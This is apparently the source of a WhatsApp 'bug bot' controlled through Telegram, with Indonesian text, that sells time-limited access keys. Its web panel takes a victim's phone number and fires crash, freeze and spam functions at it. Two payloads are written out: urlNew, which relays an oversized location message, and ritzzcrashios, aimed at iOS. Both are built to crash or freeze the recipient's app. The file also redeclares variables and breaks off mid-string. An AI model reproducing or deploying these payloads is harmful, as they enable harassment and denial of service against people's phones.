// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //

// Access control functions
function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

/*function saveAkses(data) {
  const normalized = {
    owners: data.owners.map(id => id.toString()),
    akses: data.akses.map(id => id.toString())
  };
  fs.writeFileSync(file, JSON.stringify(normalized, null, 2));
}*/

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

// Key generation functions
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(
    `🔄 Pairing dengan nomor *${BotNumber}*...`, 
    { parse_mode: "Markdown" }
  );

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("❌ Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  // === DEBUG UPDATE KONEKSI ===
  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    console.log("DEBUG connection.update:", connection, lastDisconnect?.error?.output?.statusCode);

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      console.log("⚠️ Koneksi close, code:", code);

      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      console.log(`✅ Bot ${BotNumber} berhasil terhubung ke WhatsApp!`);
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      console.log(`⏳ Bot ${BotNumber} sedang connecting...`);

      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "RYZZBAIL");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          console.log(`🔑 Pairing code untuk ${BotNumber}: ${formatted}`);

          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("❌ Error saat requestPairingCode:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const teks = `( 🫟 ) ─ 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗫 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 👾
── Un sistema de automatización revolucionario La próxima generación de bots, con alta velocidad, flexibilidad y seguridad absoluta, está despertando。

ᯓ 「 𝐄𝐕𝐎 ↯ 𝐂𝐥𝐨𝐮𝐝 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
 𖠁 Owner : —!x 'RyzzXBCloud
 ࿇ Type : ( Case─Plugins )
 ࿇ League : Asia/Jakarta 

╭──── ▢ ( ☫ ) Sender
〣 ▢ owner users
│── /connect — <nomor>
│── /listsender —
│── /delsender — <nomor>
╰─────
╭──── ▢ ( ☫ ) Key Manager
〣 ▢ admin users
│── /ckey — <username,durasi>
│── /listkey —
│── /delkey — <username>
╰─────
╭──── ▢ ( ☫ ) Access Controls
〣 ▢ owner users
│── /addacces — <user/id>
│── /delacces — <user/id>
│── /addowner — <user/id>
│── /delowner — <user/id>
╰─────`;
  ctx.replyWithMarkdown(teks);
});

// Sender management commands
bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /connect Number_\n_Example : /connect 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Key management commands
bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!args || !args.includes(",")) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /ckey User,Day\n_Example : /ckey rizxz,30d", { parse_mode: "Markdown" });
  }

  const [username, durasiStr] = args.split(",");
  const durationMs = parseDuration(durasiStr.trim());
  if (!durationMs) return ctx.reply("❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  ctx.replyWithMarkdown(`✅ *Key berhasil dibuat:*\n\n*Username:* \`${username}\`\n*Key:* \`${key}\`\n*Expired:* _${expiredStr}_ WIB`);
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey rizxvelz");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
⠀⠀⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
 「 BOT EVOURTH WEB 」
 ─ OWNER : ${OwnerId}
 ─ DEVELOPER : RYZZXCLOUD
 ─ BOT STATUS : ONLINE 🔥
 ──────━━━━━─────`));

initializeWhatsAppConnections();
console.log("=== DEBUG SESSIONS ===");
console.log("sessions.size =", sessions.size);
console.log("sessions list =", [...sessions.keys()]);
// ==================== WEB SERVER ==================== //


const session = require("express-session");



const DB_FILE = "./database/user.json";

app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
  secret: "evourth-secret-key",
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 1000 * 60 * 60 } // 1 jam
}));

// --- load users ---
function loadUsers() {
  if (!fs.existsSync(DB_FILE)) return [];
  return JSON.parse(fs.readFileSync(DB_FILE));
}

// --- hapus expired ---
function cleanExpiredUsers() {
  let users = loadUsers();
  const now = Date.now();
  users = users.filter(u => now <= u.expired);
  fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2));
  return users;
}

// --- cek key ---
function detectKey(username, key) {
  const users = cleanExpiredUsers();
  const user = users.find(u => u.username === username);
  if (!user) return { valid: false, reason: "Username tidak ditemukan" };
  if (user.key !== key) return { valid: false, reason: "Key salah" };
  if (Date.now() > user.expired) return { valid: false, reason: "Key expired" };
  return { valid: true, expired: user.expired };
}

// --- routes ---
app.get("/", (req, res) => res.redirect("/login"));

app.get("/login", (req, res) => {
  res.sendFile(path.resolve("HCS-View/Login.html"));
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const result = detectKey(username, key);

  if (!result.valid) {
    return res.redirect(`/login?msg=${encodeURIComponent("❌ " + result.reason)}`);
  }

  // simpan session
  req.session.user = username;
  req.session.expired = result.expired;
res.redirect("/execution");
});

 









  

  

app.get("/execution", (req, res) => {
    const sessionUser = req.session;
const username = req.session.user;

  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["evoxellent", "evogalaxy"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "evoxellent") {
        RexusFcSpam(target);
        rexuscrashchat(target);
        RexusInvisChat(target);
        CrashRexusInvis(target);
      } else if (mode === "evogalaxy") {
        RitzzDeviceCrash(target);
        RexusExtremeCrash(target);
        RexusFreeze(target);
        RitzzSpamNotif(target);
        urlNew(sock, target);
      } else if (mode === "xavier") {
        RexusDelayCrash(sock, target);
        crashclick(sock, target);
        Qlay(sock, target)
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

const express = require("express");
const app = express();

app.use(express.json());

// contoh route
app.get("/", (req, res) => {
  res.send("🔥 Evourth Aktif di Vercel!");
});

// ❌ Hapus app.listen()
// ✅ Ganti export app
module.exports = app;

// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// Simpan Func Ampas Mu //
async function urlNew(sock, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: -9.09999262999,
        degreesLongitude: 199.99963118999,
        jpegThumbnail: null,
        name: "ꦽ".repeat(45000),
        address: "",
        url: "https://t.me/ryzzxcloud" + "؂ن؃".repeat(100000) + ".com",
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 2000 },
              () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
          ],
          externalAdReply: {
            quotedAd: {
              advertiserName: " ؂ن؃".repeat(10000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
          },
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000,
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              creatorName: "Bot",
            },
          },
        },
      },
    },
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }],
          },
        ],
      },
    ],
  });
}

async function ritzzcrashios(target) {
      try {
        await ritzz.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "⟅ ༑ ▾𝐓𝐇𝐄𝐂𝐑𝐀𝐂𝐇 🩸 𝐗͜-𝐈𝐎𝐒⟅ ༑ ▾",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "⟅ ༑ ▾𝐑͜𝐄͡𝐗͢𝐔͜𝐒",
                  body: "⟅ ༑ ▾𝐑͜𝐄͡𝐗͢𝐔͜𝐒 🩸 𝐗͜-𝐓͡𝐑͢𝐀͜𝐒͡𝐇⟅ ༑ ▾",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9